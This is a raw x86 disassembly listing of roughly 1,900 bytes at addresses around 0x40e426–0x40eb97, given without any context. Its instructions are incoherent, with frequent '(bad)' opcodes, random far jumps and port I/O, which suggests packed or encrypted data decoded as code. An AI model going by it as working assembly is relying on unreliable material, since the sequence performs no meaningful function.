  40e426:	sbb    dh,BYTE PTR [edx-0x4b601f8f]
  40e42c:	jecxz  0x40e482
  40e42e:	ret    
  40e42f:	dec    ebp
  40e430:	adc    BYTE PTR [esi+0x3a],0x78
  40e434:	pop    es
  40e435:	mov    dl,0xd
  40e437:	pop    es
  40e438:	mov    al,0xe7
  40e43a:	bound  eax,QWORD PTR [eax]
  40e43c:	loopne 0x40e460
  40e43e:	adc    eax,esp
  40e440:	popa   
  40e441:	test   al,0x94
  40e443:	jmp    0x8d51:0x6172786f
  40e44a:	jmp    0x6c8081ed
  40e44f:	cdq    
  40e450:	jne    0x40e3ea
  40e452:	mov    ecx,0x3337d04e
  40e457:	xchg   edi,eax
  40e458:	ret    
  40e459:	mov    ah,0x7
  40e45b:	fisttp DWORD PTR [ebp-0x99de6d7]
  40e461:	gs adc eax,0x9b78fbb2
  40e467:	mov    dh,0x7
  40e469:	popa   
  40e46a:	rcr    esp,cl
  40e46c:	cmp    ebp,DWORD PTR [edx]
  40e46e:	call   0x3020:0xeecc7a8e
  40e475:	and    edx,DWORD PTR [ecx+0x40]
  40e478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e479:	out    0x31,al
  40e47b:	sub    eax,0x596e2862
  40e480:	sub    DWORD PTR [ebp+0x6c5a5345],0x9a9cbec2
  40e48a:	mov    al,0xae
  40e48c:	or     eax,0xa163918a
  40e491:	sbb    eax,0xa6f5a2b6
  40e496:	xor    DWORD PTR ds:0x59ecefeb,edi
  40e49c:	in     al,dx
  40e49d:	cmp    dh,bh
  40e49f:	(bad)
  40e4a2:	mov    ss,ecx
  40e4a4:	push   esi
  40e4a5:	jbe    0x40e4f8
  40e4a7:	stc    
  40e4a8:	cmp    al,0x15
  40e4aa:	push   esp
  40e4ab:	adc    eax,0xa9c8f0e7
  40e4b0:	push   cs
  40e4b1:	or     BYTE PTR [edx+0x37260345],0xdf
  40e4b8:	cmp    ch,BYTE PTR [esi+0x72]
  40e4bb:	adc    esp,DWORD PTR [eax-0x78437473]
  40e4c1:	add    BYTE PTR [eax],0x14
  40e4c4:	sub    DWORD PTR fs:[esi+ebp*2-0x4],esi
  40e4c9:	cmp    al,0x26
  40e4cb:	and    eax,0xe8a28ce8
  40e4d0:	(bad)  
  40e4d1:	cmp    ecx,DWORD PTR [ecx+0x34199275]
  40e4d7:	pop    ecx
  40e4d8:	push   eax
  40e4d9:	push   cs
  40e4da:	imul   esi,DWORD PTR [edi-0x7b179ddb],0x6530380e
  40e4e4:	mov    eax,0xb96e9f64
  40e4e9:	jae    0x40e562
  40e4eb:	push   ecx
  40e4ec:	das    
  40e4ed:	cmp    ebp,DWORD PTR [edx+esi*8-0x30ba47e2]
  40e4f4:	pop    es
  40e4f5:	mov    dl,0x3c
  40e4f7:	cmp    DWORD PTR ds:0x37040bac,eax
  40e4fd:	fwait
  40e4fe:	stc    
  40e4ff:	or     al,0x92
  40e502:	addr16 das 
  40e504:	jo     0x40e4f1
  40e506:	push   ebx
  40e507:	and    DWORD PTR [ecx],ebp
  40e509:	aad    0x1d
  40e50b:	out    dx,al
  40e50c:	scas   eax,DWORD PTR es:[edi]
  40e50d:	das    
  40e50e:	or     esp,0x1d
  40e511:	inc    ecx
  40e512:	aad    0x94
  40e514:	loop   0x40e535
  40e516:	lahf   
  40e517:	outs   dx,BYTE PTR ds:[esi]
  40e518:	sbb    bh,BYTE PTR [eax+0x39edc897]
  40e51e:	cmp    BYTE PTR [edx-0x6087d597],0x5
  40e525:	and    ah,BYTE PTR [ebx]
  40e527:	cld    
  40e528:	pop    ebp
  40e529:	dec    esp
  40e52a:	xchg   BYTE PTR [ebx],al
  40e52c:	sbb    eax,0x78d5e147
  40e531:	out    0x7f,al
  40e533:	fiadd  WORD PTR [edx+0x7428aa90]
  40e539:	(bad)  
  40e53b:	(bad)  
  40e53c:	clc    
  40e53d:	sbb    eax,0x723336aa
  40e542:	(bad)  
  40e543:	push   ecx
  40e544:	sub    esi,DWORD PTR [eax]
  40e546:	ins    BYTE PTR es:[edi],dx
  40e547:	mov    ds:0xfb3ab1d6,eax
  40e54c:	jg     0x40e4db
  40e54e:	out    dx,al
  40e54f:	or     al,0xc1
  40e551:	xchg   edi,eax
  40e552:	xor    al,0xbc
  40e554:	fcomip st,st(6)
  40e556:	mov    cs,WORD PTR [ebx]
  40e558:	xchg   ecx,eax
  40e559:	xchg   edi,eax
  40e55a:	and    DWORD PTR [ebx+edx*1],esp
  40e55d:	add    DWORD PTR ds:0x2de44589,esp
  40e563:	push   ebp
  40e564:	repz cmp eax,DWORD PTR [ecx+0x3d4998b6]
  40e56b:	cs dec edx
  40e56d:	lock mul al
  40e570:	mov    esi,0x2d03189
  40e575:	pop    edi
  40e576:	push   edx
  40e577:	sub    DWORD PTR [edx-0x2],esi
  40e57a:	mov    eax,ds:0xc7a91baf
  40e57f:	rcl    esp,cl
  40e581:	push   ds
  40e582:	and    BYTE PTR [ecx+0x4a89b1e0],bh
  40e588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e589:	scas   eax,DWORD PTR es:[edi]
  40e58a:	xchg   ecx,eax
  40e58b:	sbb    edx,DWORD PTR [ebx+0x4b28c559]
  40e591:	sahf   
  40e592:	inc    edi
  40e593:	mov    ds:0x802354d7,al
  40e598:	dec    ebp
  40e599:	mov    ch,0xe3
  40e59b:	in     al,0x33
  40e59d:	or     bl,BYTE PTR [ecx-0x2786007e]
  40e5a3:	push   esp
  40e5a4:	inc    esp
  40e5a5:	test   DWORD PTR gs:[ebx],0xf46deede
  40e5ac:	test   eax,0x71ba20fd
  40e5b1:	mov    bh,0x60
  40e5b3:	xchg   edi,eax
  40e5b4:	out    0x1d,al
  40e5b6:	xchg   edx,eax
  40e5b7:	or     dl,BYTE PTR [esi]
  40e5b9:	leave  
  40e5ba:	mov    ah,0x7f
  40e5bc:	into   
  40e5bd:	ins    BYTE PTR es:[edi],dx
  40e5be:	dec    ecx
  40e5bf:	push   ss
  40e5c0:	das    
  40e5c1:	(bad)  
  40e5c2:	push   ecx
  40e5c3:	fs cmp al,0x51
  40e5c6:	fadd   DWORD PTR [ebp-0x25]
  40e5c9:	pop    ss
  40e5ca:	and    BYTE PTR [edx*4-0x105c8e2b],bh
  40e5d1:	mov    edx,0x146acbc6
  40e5d6:	or     eax,0x9d13e828
  40e5db:	dec    edx
  40e5dc:	xor    eax,DWORD PTR [ebp-0x38769ed3]
  40e5e2:	inc    ecx
  40e5e4:	(bad)  
  40e5e5:	js     0x40e597
  40e5e7:	push   0xa57d2b88
  40e5ec:	clc    
  40e5ed:	pop    ecx
  40e5ee:	imul   eax,DWORD PTR [ebx+0x53],0x35
  40e5f2:	aad    0xd6
  40e5f4:	jmp    0x40e5e5
  40e5f6:	or     DWORD PTR [edi+0x4c8dc657],ebp
  40e5fc:	pop    ss
  40e5fd:	mov    DWORD PTR [edi+edx*1+0x1d],edx
  40e601:	out    dx,al
  40e602:	inc    edx
  40e603:	mov    esp,0xf3538eb8
  40e608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e609:	outs   dx,DWORD PTR ds:[esi]
  40e60a:	fwait
  40e60b:	popf   
  40e60c:	xlat   BYTE PTR ds:[ebx]
  40e60d:	push   cs
  40e60e:	sub    cl,cl
  40e610:	xor    BYTE PTR [eax-0x68],bh
  40e613:	fs mov bl,0xd
  40e616:	(bad)
  40e619:	int3   
  40e61a:	xchg   BYTE PTR [ecx],bh
  40e61c:	(bad)  
  40e61d:	pop    edx
  40e61e:	cdq    
  40e61f:	cmc    
  40e620:	sbb    bh,BYTE PTR [ebp+0x2]
  40e623:	pushf  
  40e624:	mov    bh,0xb
  40e626:	icebp  
  40e627:	out    0xd0,al
  40e629:	adc    eax,0x8c787588
  40e62e:	stos   DWORD PTR es:[edi],eax
  40e62f:	xor    ebp,esi
  40e631:	test   al,0x18
  40e633:	jp     0x40e633
  40e635:	sbb    al,0x1a
  40e637:	ret    0xb3a5
  40e63a:	dec    edx
  40e63b:	push   0xc0d7cade
  40e640:	gs scas eax,DWORD PTR es:[edi]
  40e642:	mov    bl,0x2e
  40e644:	fwait
  40e645:	adc    al,0x86
  40e647:	adc    ebp,DWORD PTR [ecx-0xc]
  40e64a:	ret    
  40e64b:	aad    0x5e
  40e64d:	sub    eax,0x8ef81dab
  40e652:	(bad)  
  40e653:	aaa    
  40e654:	les    eax,FWORD PTR [ecx+0x1183db12]
  40e65a:	fiadd  DWORD PTR [ecx]
  40e65c:	mov    dl,0xa3
  40e65e:	in     al,dx
  40e65f:	or     edx,edi
  40e661:	data16 aas 
  40e663:	inc    esi
  40e664:	mov    bh,0x52
  40e666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e667:	imul   ebx,DWORD PTR [eax+0x266af7c3],0xffffffc6
  40e66e:	dec    edi
  40e66f:	push   edx
  40e670:	cdq    
  40e671:	push   ebx
  40e672:	dec    ecx
  40e673:	in     al,0x38
  40e675:	add    BYTE PTR [edx+0x33],bl
  40e678:	imul   ecx,DWORD PTR [esi-0x1bf56d46],0x1b
  40e67f:	int3   
  40e680:	imul   edi,DWORD PTR ds:0xfb297c22,0xd1d84676
  40e68a:	outs   dx,BYTE PTR ss:[esi]
  40e68c:	mov    eax,ds:0x52945be2
  40e691:	fcomp  QWORD PTR [esi+0x399741]
  40e697:	pop    esp
  40e698:	in     eax,0x70
  40e69a:	sub    ebx,ebp
  40e69c:	hlt    
  40e69d:	cmp    DWORD PTR [eax],0xb
  40e6a0:	or     al,0x4e
  40e6a2:	jns    0x40e6f6
  40e6a4:	fcmovu st,st(3)
  40e6a6:	loop   0x40e655
  40e6a8:	or     eax,0x5492983f
  40e6ad:	push   edx
  40e6ae:	lods   eax,DWORD PTR ds:[esi]
  40e6af:	push   ds
  40e6b0:	ret    0xd84f
  40e6b3:	sbb    edi,DWORD PTR [ecx]
  40e6b5:	cdq    
  40e6b6:	mov    ecx,0xb8095057
  40e6bb:	int3   
  40e6bc:	popf   
  40e6bd:	test   eax,0x64d8f820
  40e6c2:	imul   ebx,DWORD PTR [eax],0xaa0522fc
  40e6c8:	mov    al,ds:0xf1a701c3
  40e6cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ce:	jne    0x40e741
  40e6d0:	sub    eax,0x6c888834
  40e6d5:	lock sub ch,dh
  40e6d8:	dec    ecx
  40e6d9:	push   DWORD PTR [esi+0x21d8bf6]
  40e6df:	xchg   BYTE PTR [edi+0x319832e0],ah
  40e6e5:	sub    BYTE PTR [ecx+0x1ed00443],bh
  40e6eb:	(bad)  
  40e6ed:	popf   
  40e6ee:	ror    edi,1
  40e6f0:	dec    edx
  40e6f1:	ret    
  40e6f2:	pop    ss
  40e6f3:	std    
  40e6f4:	jb     0x40e68b
  40e6f6:	sub    BYTE PTR [ecx],dh
  40e6f8:	out    0x1e,al
  40e6fa:	jno    0x40e73f
  40e6fc:	jno    0x40e769
  40e6fe:	mov    eax,ds:0x284ecbae
  40e703:	arpl   WORD PTR [esp-0x3e57be1a],bp
  40e70a:	pop    eax
  40e70b:	mov    bh,0xde
  40e70d:	or     esp,ecx
  40e70f:	ins    BYTE PTR es:[edi],dx
  40e710:	mov    eax,0xbd96c79e
  40e715:	inc    eax
  40e716:	push   cs
  40e717:	jns    0x40e768
  40e719:	jmp    0x6f06fe3c
  40e71e:	ins    BYTE PTR es:[edi],dx
  40e71f:	xor    DWORD PTR [eax-0x120d03ed],0x218e327d
  40e729:	mov    edx,0xf615149a
  40e72e:	jnp    0x40e75c
  40e730:	hlt    
  40e731:	xchg   edx,eax
  40e732:	shl    BYTE PTR [ecx],1
  40e734:	or     DWORD PTR [edx-0x7b572006],0x74a7462c
  40e73e:	mov    ds:0x9def109f,al
  40e743:	jle    0x40e77b
  40e745:	push   eax
  40e746:	bound  eax,QWORD PTR [edx+edi*1]
  40e749:	icebp  
  40e74a:	xor    DWORD PTR [ebx+0x5f],ebx
  40e74d:	lock pop edx
  40e74f:	dec    ebp
  40e750:	ficomp DWORD PTR [edx]
  40e752:	mov    ebx,0x412f947d
  40e757:	mov    bl,0xc4
  40e759:	test   eax,0x53698df2
  40e75e:	jg     0x40e7d7
  40e760:	adc    eax,0xd2ce98ab
  40e765:	arpl   WORD PTR [esi-0x66478623],bx
  40e76b:	jp     0x40e77e
  40e76d:	(bad)  [eax]
  40e76f:	jmp    0x40e75f
  40e771:	cmc    
  40e772:	inc    ebp
  40e773:	dec    eax
  40e774:	push   cs
  40e775:	adc    al,0x4
  40e777:	cmp    al,0x48
  40e779:	sub    al,0xa0
  40e77b:	mov    ecx,0x213e9fc8
  40e780:	inc    edx
  40e781:	mov    DWORD PTR [eax+0x1f],ecx
  40e784:	dec    eax
  40e785:	sti    
  40e786:	pop    es
  40e787:	call   0x4fcc:0x48b68e77
  40e78e:	ret    0x6c7d
  40e791:	jp     0x40e811
  40e793:	call   0x653c8d3b
  40e798:	fwait
  40e799:	add    al,0x9e
  40e79b:	mov    ch,0x81
  40e79d:	add    ebp,DWORD PTR [edx-0x9]
  40e7a0:	fbld   TBYTE PTR [ebp-0x71bdc036]
  40e7a6:	push   ebp
  40e7a7:	mov    ebx,DWORD PTR [ebp-0xd]
  40e7aa:	call   0x50da:0x7f8922f5
  40e7b1:	unpcklps xmm7,XMMWORD PTR [ebx-0x80]
  40e7b5:	mov    bl,0x6d
  40e7b7:	stc    
  40e7b8:	sub    BYTE PTR [esi-0x16],0x8c
  40e7bc:	mov    dh,bl
  40e7be:	pop    ecx
  40e7bf:	repnz inc edx
  40e7c1:	add    DWORD PTR [ebx],0xffffffbc
  40e7c4:	add    al,0x5f
  40e7c6:	(bad)  
  40e7c7:	je     0x40e7f7
  40e7c9:	ficom  DWORD PTR [eax+0x39812d28]
  40e7cf:	cmp    BYTE PTR [ecx-0x23f24eb6],ah
  40e7d5:	popf   
  40e7d6:	ins    BYTE PTR es:[edi],dx
  40e7d7:	xor    al,0x9e
  40e7d9:	inc    ebp
  40e7da:	pop    ds
  40e7db:	loop   0x40e7a9
  40e7dd:	jp     0x40e7aa
  40e7df:	push   esp
  40e7e0:	cmp    dl,BYTE PTR [ebp-0x58]
  40e7e3:	aas    
  40e7e4:	push   edx
  40e7e5:	out    dx,eax
  40e7e6:	xchg   ebp,eax
  40e7e7:	jb     0x40e799
  40e7e9:	adc    dl,0x23
  40e7ec:	adc    eax,0xbb552175
  40e7f1:	adc    ah,ch
  40e7f3:	jns    0x40e846
  40e7f5:	hlt    
  40e7f6:	out    dx,eax
  40e7f7:	pop    es
  40e7f8:	cmp    DWORD PTR [esi-0x12748de4],edi
  40e7fe:	sub    eax,0x80aa8629
  40e803:	xchg   edi,eax
  40e804:	or     al,0xff
  40e806:	or     eax,0x113f2c07
  40e80b:	xchg   esi,eax
  40e80c:	push   esi
  40e80d:	sahf   
  40e80e:	sbb    BYTE PTR [esi],bh
  40e810:	sub    DWORD PTR [ebp-0xd],0xbfb0a136
  40e817:	xlat   BYTE PTR ds:[ebx]
  40e818:	inc    ebp
  40e819:	sbb    BYTE PTR [ebx-0x5b],cl
  40e81c:	in     al,0x6d
  40e81e:	ret    
  40e81f:	cmp    eax,0x3d7ab42c
  40e824:	ja     0x40e821
  40e826:	cmp    DWORD PTR [eax-0x3f],esi
  40e829:	ds mov cl,0x2a
  40e82c:	fstp   QWORD PTR [esi]
  40e82e:	push   edx
  40e82f:	ret    0x250d
  40e832:	jmp    0xd788:0xb17249fd
  40e839:	out    dx,eax
  40e83a:	retf   0xba20
  40e83d:	(bad)  
  40e83e:	xchg   ebp,eax
  40e83f:	int    0xcd
  40e841:	fwait
  40e842:	mov    ebx,ebx
  40e844:	ins    DWORD PTR es:[edi],dx
  40e845:	retf   
  40e846:	add    esi,eax
  40e848:	xchg   BYTE PTR [esi],ah
  40e84a:	das    
  40e84b:	mov    al,ds:0x2da20958
  40e850:	jnp    0x40e7f9
  40e852:	(bad)  
  40e853:	push   ebx
  40e854:	les    esp,FWORD PTR [esi]
  40e856:	adc    ebx,ebx
  40e858:	pop    ds
  40e859:	xlat   BYTE PTR ds:[ebx]
  40e85a:	mov    ds:0x4201104,al
  40e85f:	rol    BYTE PTR [ebp+0x5d],0x53
  40e863:	sub    ah,cl
  40e865:	inc    ebp
  40e866:	iret   
  40e867:	fisub  DWORD PTR [edx+ecx*4-0x49]
  40e86b:	or     ebp,DWORD PTR [edi+0x58]
  40e86e:	cmp    ah,BYTE PTR [ecx]
  40e870:	dec    edx
  40e871:	mov    bl,0x3b
  40e873:	push   esp
  40e874:	repz imul ebp,DWORD PTR [edx],0x28
  40e878:	mov    esp,0x4332ea94
  40e87d:	jl     0x40e8c6
  40e87f:	mov    ch,0xfd
  40e881:	push   DWORD PTR [esi]
  40e883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e884:	inc    eax
  40e885:	rol    edx,cl
  40e887:	jp     0x40e89a
  40e889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e88a:	neg    bl
  40e88c:	mov    edx,0x9dbecf3a
  40e891:	mov    ah,0xe1
  40e893:	stos   DWORD PTR es:[edi],eax
  40e894:	lock nop
  40e896:	sbb    BYTE PTR [esi+0x549853c8],bl
  40e89c:	rcr    DWORD PTR [eax-0x29],1
  40e89f:	inc    esp
  40e8a0:	pop    esi
  40e8a1:	mov    WORD PTR [ecx],?
  40e8a3:	(bad)
  40e8a8:	add    BYTE PTR [esi],0xaa
  40e8ab:	or     eax,0x1692099
  40e8b0:	icebp  
  40e8b1:	aad    0x4
  40e8b3:	addr16 out dx,eax
  40e8b5:	xchg   edi,eax
  40e8b6:	lahf   
  40e8b7:	dec    ecx
  40e8b8:	pop    eax
  40e8b9:	stc    
  40e8ba:	jb     0x40e8d3
  40e8bc:	rcl    eax,cl
  40e8be:	push   es
  40e8bf:	pushf  
  40e8c0:	fcomp  DWORD PTR [eax]
  40e8c2:	or     eax,0xa9bad99a
  40e8c7:	cdq    
  40e8c8:	and    ecx,DWORD PTR [esi+0x51]
  40e8cb:	shl    BYTE PTR [edi],0x7d
  40e8ce:	(bad)  
  40e8d0:	jb     0x40e871
  40e8d2:	rcl    DWORD PTR [edx],0xfa
  40e8d5:	dec    eax
  40e8d6:	jne    0x40e8b4
  40e8d8:	ja     0x40e93e
  40e8da:	dec    esi
  40e8db:	pusha  
  40e8dc:	adc    DWORD PTR [eax],edx
  40e8de:	mov    ?,WORD PTR ds:0xb11768b6
  40e8e4:	(bad)
  40e8e8:	cmc    
  40e8e9:	adc    al,0x8d
  40e8eb:	cld    
  40e8ec:	or     DWORD PTR [edx],ebp
  40e8ee:	inc    ebx
  40e8ef:	out    0x4d,eax
  40e8f1:	and    eax,0x30a10729
  40e8f6:	mov    dl,0xc4
  40e8f8:	push   ds
  40e8f9:	test   ah,al
  40e8fb:	lods   al,BYTE PTR ds:[esi]
  40e8fc:	mov    ?,WORD PTR [ecx-0x4ec602b4]
  40e902:	outs   dx,BYTE PTR ds:[esi]
  40e903:	std    
  40e904:	xor    DWORD PTR [ebx],esi
  40e906:	or     DWORD PTR [ebx+eax*2],0x3
  40e90a:	push   edx
  40e90b:	pusha  
  40e90c:	out    dx,eax
  40e90d:	mov    dl,0x72
  40e90f:	fbstp  TBYTE PTR [ecx]
  40e911:	hlt    
  40e912:	add    ch,BYTE PTR [ebx+0x532cc316]
  40e918:	out    dx,al
  40e919:	das    
  40e91a:	mov    eax,ds:0xd8ae8011
  40e91f:	jne    0x40e8a4
  40e921:	inc    esp
  40e922:	out    0xd2,eax
  40e924:	stos   BYTE PTR es:[edi],al
  40e925:	mov    ds:0x9b782898,eax
  40e92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e92b:	xor    al,0xee
  40e92d:	jo     0x40e989
  40e92f:	push   ebx
  40e930:	mul    bl
  40e932:	rol    bl,0x79
  40e935:	sbb    ebp,DWORD PTR [ebx+0x72]
  40e938:	adc    eax,0x99f7be1f
  40e93d:	sar    DWORD PTR es:[esi],0x45
  40e941:	(bad)  
  40e943:	xor    al,bh
  40e945:	add    BYTE PTR [esi-0x5],ch
  40e948:	adc    ecx,esp
  40e94a:	sbb    ecx,DWORD PTR [bp+si-0x1fab]
  40e94f:	add    al,0x67
  40e951:	xchg   ecx,eax
  40e952:	mov    ds:0x353ab938,al
  40e957:	(bad)  
  40e958:	xchg   esi,eax
  40e959:	jl     0x40e8ea
  40e95b:	mov    dl,0x58
  40e95d:	mov    dh,BYTE PTR [ebx+ebp*2]
  40e960:	test   edi,0xfb3f1aad
  40e966:	push   esi
  40e967:	xchg   ch,dl
  40e969:	nop
  40e96a:	addr16 and edx,ecx
  40e96d:	xchg   edi,eax
  40e96e:	add    esi,DWORD PTR [edx+0x50]
  40e971:	or     ecx,0x1e
  40e974:	sbb    eax,ebp
  40e976:	call   0x8ec8:0xaac54e33
  40e97d:	and    ebp,DWORD PTR [ebx+0x11877ff6]
  40e983:	inc    ebx
  40e984:	iret   
  40e985:	ret    
  40e986:	(bad)  [esp+ecx*2]
  40e989:	add    al,0x23
  40e98b:	cmp    BYTE PTR [ecx+0xe],ah
  40e98e:	sub    edi,eax
  40e990:	loopne 0x40e92a
  40e992:	pusha  
  40e993:	lea    ebp,[ebx-0x5c]
  40e996:	sub    dh,BYTE PTR [edi+0x29]
  40e999:	ss rcl ebp,cl
  40e99c:	mov    esi,0x6e14a25b
  40e9a1:	jg     0x40e986
  40e9a3:	loop   0x40ea1c
  40e9a5:	sub    BYTE PTR [ecx-0x4e096f28],ah
  40e9ab:	aam    0x7b
  40e9ad:	dec    ebp
  40e9ae:	mov    BYTE PTR [esi],0xd8
  40e9b1:	or     eax,edx
  40e9b3:	mov    DWORD PTR [edx],esp
  40e9b5:	test   al,0x95
  40e9b7:	cli    
  40e9b8:	imul   BYTE PTR [ecx+0x193accce]
  40e9be:	pop    ebp
  40e9bf:	or     eax,0x83ee398d
  40e9c4:	out    dx,al
  40e9c5:	xor    ebx,DWORD PTR [ecx+0x20]
  40e9c8:	repnz mov BYTE PTR [ebp+0x6d],al
  40e9cc:	inc    esi
  40e9cd:	sti    
  40e9ce:	or     edx,ebx
  40e9d0:	mov    al,ds:0xd06c90e5
  40e9d5:	cmp    al,0xfd
  40e9d7:	ja     0x40ea0b
  40e9d9:	das    
  40e9da:	and    DWORD PTR [ebx-0x3e3bbe9f],edi
  40e9e0:	mov    cl,0xe9
  40e9e2:	add    ebx,DWORD PTR [edx-0x1c]
  40e9e5:	sbb    al,0x70
  40e9e7:	mov    ecx,0x76d46304
  40e9ec:	dec    eax
  40e9ed:	cmc    
  40e9ee:	pop    eax
  40e9ef:	sbb    al,0x78
  40e9f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9f2:	aaa    
  40e9f3:	test   eax,0x219576ae
  40e9f8:	dec    esp
  40e9f9:	mov    dh,0xa3
  40e9fb:	test   al,0xdb
  40e9fd:	mov    ebx,0xbb99f5dc
  40ea02:	test   BYTE PTR [edi+0x908c9ed],0x72
  40ea09:	in     al,dx
  40ea0a:	sbb    esi,DWORD PTR [esi]
  40ea0c:	xchg   ecx,eax
  40ea0d:	ret    
  40ea0e:	jbe    0x40ea08
  40ea10:	cmp    ah,ah
  40ea12:	aaa    
  40ea13:	pushf  
  40ea14:	mov    eax,0xd976bb00
  40ea19:	cmp    eax,0x74d7df44
  40ea1e:	fst    DWORD PTR [ebx+0x48]
  40ea21:	sbb    bh,0xf5
  40ea24:	arpl   WORD PTR [edx],sp
  40ea26:	dec    ecx
  40ea27:	xchg   edx,eax
  40ea28:	out    dx,eax
  40ea29:	(bad)  
  40ea2a:	hlt    
  40ea2b:	stos   BYTE PTR es:[edi],al
  40ea2c:	jmp    0x6be27dba
  40ea31:	mov    esi,0x3906aa6e
  40ea36:	imul   edx,DWORD PTR [eax+0xca9af51],0xffffff8e
  40ea3d:	xor    dh,BYTE PTR [edi-0x6306108d]
  40ea43:	loop   0x40ea64
  40ea45:	sbb    DWORD PTR [eax-0x60bccd71],ecx
  40ea4b:	cwde   
  40ea4c:	arpl   WORD PTR [esi],dx
  40ea4e:	add    al,0x61
  40ea50:	add    BYTE PTR [ebx-0x2c],0x54
  40ea54:	aas    
  40ea55:	push   ss
  40ea56:	sbb    al,BYTE PTR [edx]
  40ea58:	push   esi
  40ea59:	std    
  40ea5a:	cmp    al,0x8f
  40ea5c:	dec    edx
  40ea5d:	jnp    0x40ea43
  40ea5f:	push   ecx
  40ea60:	fistp  DWORD PTR [edx+0x63a55f02]
  40ea66:	(bad)  
  40ea68:	loop   0x40eac7
  40ea6a:	fwait
  40ea6b:	inc    edx
  40ea6c:	dec    ebx
  40ea6d:	push   esp
  40ea6e:	pusha  
  40ea6f:	es fiadd WORD PTR ss:[edi]
  40ea73:	xor    DWORD PTR [eax+esi*1-0x52],0x16
  40ea78:	inc    esi
  40ea79:	xor    al,0x1c
  40ea7b:	fisub  WORD PTR [edi]
  40ea7d:	mov    dl,0x76
  40ea7f:	cmp    eax,0x178e7e69
  40ea84:	mov    edi,edx
  40ea86:	pop    ecx
  40ea87:	scas   al,BYTE PTR es:[edi]
  40ea88:	sub    ebx,DWORD PTR [edi+0x1c]
  40ea8b:	mov    edi,0x3ed5b90
  40ea90:	mov    ds:0x6c3f8fca,al
  40ea95:	mov    edx,DWORD PTR [ecx]
  40ea97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea98:	adc    edx,edx
  40ea9a:	lods   eax,DWORD PTR ds:[esi]
  40ea9b:	pop    edi
  40ea9c:	push   edi
  40ea9d:	outs   dx,DWORD PTR ds:[esi]
  40ea9e:	inc    si
  40eaa0:	(bad)  
  40eaa1:	sbb    al,0xa9
  40eaa3:	and    DWORD PTR [ecx-0x23f76c07],ebp
  40eaa9:	test   eax,0xae33e373
  40eaae:	jns    0x40eab3
  40eab0:	(bad)  
  40eab1:	adc    al,0x43
  40eab3:	lds    esp,FWORD PTR [ecx+0x66e1e4ba]
  40eab9:	outs   dx,DWORD PTR ds:[esi]
  40eaba:	pushf  
  40eabb:	jmp    DWORD PTR [edi-0x2]
  40eabe:	outs   dx,BYTE PTR ds:[esi]
  40eabf:	ss repz jmp 0x40eb33
  40eac3:	jmp    0x802db6c2
  40eac8:	leave  
  40eac9:	dec    BYTE PTR [ebp+ecx*1-0xb]
  40eacd:	push   eax
  40eace:	aaa    
  40eacf:	mov    ah,0x4
  40ead1:	mov    DWORD PTR [eax+esi*8],esi
  40ead4:	arpl   WORD PTR [edi+0x5b],bp
  40ead7:	jle    0x40eac3
  40ead9:	push   0xfeeef77e
  40eade:	mov    dl,0xb8
  40eae0:	push   edx
  40eae1:	sub    al,0xcb
  40eae3:	pusha  
  40eae4:	(bad)  
  40eae5:	fnstcw WORD PTR [ebx+0x1b8c974b]
  40eaeb:	js     0x40eb13
  40eaed:	scas   al,BYTE PTR es:[edi]
  40eaee:	push   cs
  40eaef:	adc    eax,0x2cc4c66c
  40eaf4:	fld    DWORD PTR [eax-0xa]
  40eaf7:	daa    
  40eaf8:	leave  
  40eaf9:	jo     0x40eb3f
  40eafb:	dec    ecx
  40eafc:	and    dl,BYTE PTR [esi+ebp*8-0x406b69d7]
  40eb03:	mov    eax,0x88c54b5b
  40eb08:	in     al,0xf
  40eb0a:	mov    ch,0x23
  40eb0c:	inc    edi
  40eb0d:	mov    dh,BYTE PTR [edx+0x2a962a13]
  40eb13:	pop    ebp
  40eb14:	pop    esi
  40eb15:	sbb    eax,0x8984ade4
  40eb1a:	(bad)  
  40eb1b:	lahf   
  40eb1c:	jae    0x40eb85
  40eb1e:	out    dx,al
  40eb1f:	pop    ds
  40eb20:	push   esi
  40eb21:	(bad)  
  40eb23:	push   ss
  40eb24:	cmp    BYTE PTR [ecx+0x2b],dh
  40eb27:	fistp  QWORD PTR es:[ecx+0x1c]
  40eb2b:	sbb    bh,al
  40eb2d:	out    dx,eax
  40eb2e:	js     0x40eaf0
  40eb30:	or     DWORD PTR [edx-0x36],esi
  40eb33:	lahf   
  40eb34:	hlt    
  40eb35:	xor    eax,0x467ed1fb
  40eb3a:	adc    ah,BYTE PTR gs:[ebx]
  40eb3d:	adc    cl,dh
  40eb3f:	aaa    
  40eb40:	adc    esp,eax
  40eb42:	xchg   ebx,eax
  40eb43:	stos   BYTE PTR es:[edi],al
  40eb44:	scas   al,BYTE PTR es:[edi]
  40eb45:	xor    BYTE PTR [ecx],bh
  40eb47:	ins    DWORD PTR es:[edi],dx
  40eb48:	pushf  
  40eb49:	test   DWORD PTR ds:0xc6d7843c,ecx
  40eb4f:	cmp    BYTE PTR [ebp-0x76],bl
  40eb52:	sub    al,0x63
  40eb54:	dec    ebx
  40eb55:	es jae 0x40eb7b
  40eb58:	adc    ah,bh
  40eb5a:	test   DWORD PTR [edi+0x7d],ebx
  40eb5d:	out    dx,eax
  40eb5e:	js     0x40eb11
  40eb60:	or     eax,0x71e8dacd
  40eb65:	cmp    DWORD PTR [ebx+0x1d5a73de],0x161fb2c2
  40eb6f:	sbb    esi,eax
  40eb71:	les    ebp,FWORD PTR [ebx+0x74e909a2]
  40eb77:	pushf  
  40eb78:	mov    dl,0xff
  40eb7a:	outs   dx,BYTE PTR ds:[esi]
  40eb7b:	leave  
  40eb7c:	sub    BYTE PTR [edx-0x1edbed7b],cl
  40eb82:	std    
  40eb83:	jo     0x40eb5f
  40eb85:	div    BYTE PTR [ecx]
  40eb87:	mov    dh,cl
  40eb89:	add    eax,0xc541e6d8
  40eb8e:	fwait
  40eb8f:	mov    ds:0xafecaebc,eax
  40eb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb95:	cmp    dl,al
  40eb97:	push   eax
